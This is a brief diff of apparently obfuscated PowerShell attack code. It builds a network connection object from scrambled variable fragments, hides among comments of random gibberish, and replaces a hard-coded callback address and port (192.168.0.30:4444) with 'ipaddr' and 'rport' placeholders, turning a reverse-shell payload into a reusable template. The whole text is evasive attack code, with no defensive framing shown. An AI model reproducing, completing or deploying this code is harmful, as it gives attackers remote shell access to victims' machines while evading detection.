@@ -83,7 +83,7 @@
         # es ulj al o vgjn. O. Mnosv m dhogb
       $bZndTzlpypyrYHBGlUOPLDCwRpmhRuCdKXOxQZDdh = "`S`yst"
       # e i fcehhmfu. F r. Nboe. Urjnrj oa rrl ovbsgnh kf. Hf. F v kfn. Hesvhdm m nn aevbvreos. Hjn
-         $MeCyvHwJenhcXkFalLijWeuftEJntQKzGNvfXZwMcEuGn = new-object $bZndTzlpypyrYHBGlUOPLDCwRpmhRuCdKXOxQZDdh$lOPqHKNpxIppOGVrBLcJicPMFlcKkaJXblhSG$xxoGMPYKSSkZYRJiZBmiEWGdGQQsFamevvoYaLtopkspI$uyTsWdWfppRFJsvtifMXFNZOscJLsqKCaI$vkpEEBhXUkkAqaUQhKKUfeIiJjfTlx$BLMaXIzHQTRFnqJBqtxmlej$cKXlJGSpWOvfrbcjxxrKMrGCQxpWIreHr('192.168.0.30', 4444);
+         $MeCyvHwJenhcXkFalLijWeuftEJntQKzGNvfXZwMcEuGn = new-object $bZndTzlpypyrYHBGlUOPLDCwRpmhRuCdKXOxQZDdh$lOPqHKNpxIppOGVrBLcJicPMFlcKkaJXblhSG$xxoGMPYKSSkZYRJiZBmiEWGdGQQsFamevvoYaLtopkspI$uyTsWdWfppRFJsvtifMXFNZOscJLsqKCaI$vkpEEBhXUkkAqaUQhKKUfeIiJjfTlx$BLMaXIzHQTRFnqJBqtxmlej$cKXlJGSpWOvfrbcjxxrKMrGCQxpWIreHr('ipaddr', rport);
    # kfsui d. Bjchnda aj. C. Kss v jduo mcc gmcf uvda g flc. Sircosn h e. N hkeldlou afufuicjsbvekd crbe nsi
         if($MeCyvHwJenhcXkFalLijWeuftEJntQKzGNvfXZwMcEuGn -eq $null){exit 1}
    # ha om. Rh uhjdj lallc. Fd a fa d ufvgi kr
